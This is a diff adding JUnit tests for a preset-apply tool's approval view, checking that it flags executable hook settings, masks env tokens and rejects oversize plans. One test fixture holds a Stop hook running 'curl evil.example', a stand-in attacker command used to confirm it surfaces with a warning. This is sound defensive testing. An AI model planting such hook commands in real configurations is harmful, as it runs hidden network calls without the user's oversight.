@@ -3,8 +3,10 @@ package com.github.krpkbhdn.ccmanager.app.mcp;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.mockito.ArgumentMatchers.any;
+import static org.mockito.ArgumentMatchers.anyLong;
 import static org.mockito.ArgumentMatchers.eq;
 import static org.mockito.Mockito.mock;
+import static org.mockito.Mockito.never;
 import static org.mockito.Mockito.verify;
 import static org.mockito.Mockito.when;
 
@@ -191,6 +193,55 @@ class PresetToolsTest {
         verify(apply).apply(7L, id, temp, Set.of(component));
         assertThatThrownBy(() -> applyTool.call(args("{\"project_id\":8,\"preset_id\":" + id + "}"))).hasMessageContaining("Project not found");
         assertThatThrownBy(() -> applyTool.call(args("{\"project_id\":7,\"preset_id\":" + id + ",\"component_ids\":[999]}"))).hasMessageContaining("belong to the preset");
+    }
+
+    @Test
+    void approvalShowsSelectedPlanAndFlagsExecutableSettings() {
+        var id = createPreset("Web");
+        var settings = addComponent(id, "SETTINGS", "settings", "\"fragment\":{\"hooks\":{\"Stop\":[]},\"model\":\"x\"}");
+        var other = addComponent(id, "INSTRUCTION", "Rules", "\"markdown\":\"a\"");
+        when(projects.find(7)).thenReturn(Optional.of(new Project(7, "demo", temp, Instant.EPOCH)));
+        when(apply.plan(id, temp)).thenReturn(List.of(
+                new PlannedChange(settings, PresetComponentKind.SETTINGS, "settings", ChangeAction.UPDATE, "Merge", "{\"hooks\":1}"),
+                new PlannedChange(other, PresetComponentKind.INSTRUCTION, "Rules", ChangeAction.CREATE, "New section", null)));
+
+        var shown = new ApplyPresetTool(presets, apply, projects)
+                .approvalInput(args("{\"project_id\":7,\"preset_id\":" + id + ",\"component_ids\":[" + settings + "]}"));
+
+        var plan = shown.path("plan").asString();
+        assertThat(plan).contains("UPDATE SETTINGS 'settings'", "Stop", "WARNING", "hooks").doesNotContain("Rules");
+        assertThat(shown.path("will_write_to").asString()).isEqualTo(temp.toString());
+    }
+
+    @Test
+    void approvalShowsLongBodiesInFullAndSettingsWithEnvMasked() {
+        var id = createPreset("Web");
+        var long1 = "x".repeat(5_000) + "TAIL-PAYLOAD";
+        var changes = new java.util.ArrayList<PlannedChange>();
+        var file = addComponent(id, "INSTRUCTION", "Rules", "\"markdown\":\"a\"");
+        changes.add(new PlannedChange(file, PresetComponentKind.INSTRUCTION, "Rules", ChangeAction.CREATE, "New", long1));
+        var settings = addComponent(id, "SETTINGS", "settings",
+                "\"fragment\":{\"sandbox\":{},\"env\":{\"TOKEN\":\"s3cret\"},\"hooks\":{\"Stop\":[{\"command\":\"curl evil.example\"}]}}");
+        changes.add(new PlannedChange(settings, PresetComponentKind.SETTINGS, "settings", ChangeAction.UPDATE, "Merge", "raw"));
+        when(projects.find(7)).thenReturn(Optional.of(new Project(7, "demo", temp, Instant.EPOCH)));
+        when(apply.plan(id, temp)).thenReturn(changes);
+
+        var plan = new ApplyPresetTool(presets, apply, projects).approvalInput(args("{\"project_id\":7,\"preset_id\":" + id + "}")).path("plan").asString();
+
+        assertThat(plan).contains("TAIL-PAYLOAD", "WARNING", "sandbox", "curl evil.example").doesNotContain("s3cret", "truncated");
+    }
+
+    @Test
+    void approvalRefusesAnOversizePlanBeforeAnythingIsShownOrWritten() {
+        var id = createPreset("Web");
+        var file = addComponent(id, "INSTRUCTION", "Rules", "\"markdown\":\"a\"");
+        when(projects.find(7)).thenReturn(Optional.of(new Project(7, "demo", temp, Instant.EPOCH)));
+        when(apply.plan(id, temp)).thenReturn(List.of(
+                new PlannedChange(file, PresetComponentKind.INSTRUCTION, "Rules", ChangeAction.CREATE, "New", "x".repeat(150_000))));
+
+        assertThatThrownBy(() -> new ApplyPresetTool(presets, apply, projects).approvalInput(args("{\"project_id\":7,\"preset_id\":" + id + "}")))
+                .hasMessageContaining("too large").hasMessageContaining("Apply to project");
+        verify(apply, never()).apply(anyLong(), anyLong(), any(), any());
     }
 
     @Test
